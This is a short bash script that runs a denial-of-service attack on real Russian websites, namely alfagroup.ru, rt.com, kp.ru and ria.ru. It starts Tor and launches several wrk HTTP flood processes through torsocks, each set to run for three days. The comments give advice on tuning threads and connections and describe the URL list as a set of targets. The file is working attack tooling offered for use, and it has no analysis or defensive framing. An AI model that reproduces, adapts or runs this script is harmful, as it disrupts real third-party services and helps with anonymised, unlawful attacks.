#!/bin/bash
# 
#    URL=$() contains simple list, change it on a vm you're running if you need remove/add targets
#
#    such scripts usually requires tunning for ultimate performance, but also I store targets of different size
#    so there is $NUM0 the smallest, $NUM1 - middle one, and $NUM2 for extra-living targets (like rt.com always somewhere working, yet :)
#
#    as a starting point keep initial threads and connections between 4-8-16
#    my values are 4-16-64
#
#    remeber:P wrk use hardware, os level threads, so it cannot be thouthands as it does in dotnet/java/etc 
#

[[ -z $(service tor status | grep "tor is running") ]] && service tor start

sleep 5

NUM0=4
NUM1=$(($NUM0*4))
NUM2=$(($NUM1*4))
DLEN=$((3*3600*24))
URLS=(
  "https://alfagroup.ru:443"
  "https://alfagroup.ru:80"
  "https://rt.com:443"
  "http://rt.com:80"
  "https://kp.ru:443"
  "http://kp.ru:80"
  "https://ria.ru:443"
  "http://ria.ru:80"
  )

for TURL in ${URLS[*]}
do
  A=$NUM1
  B=$DLEN
  C=$TURL
  
  [[ $TURL == "https://alfagroup.ru" ]] && A=$NUM1
  [[ $TURL == "https://rt.com" ]] && A=$NUM1
  
  torsocks wrk -c$A -t$A -d$B --timeout 5s $C &
done   
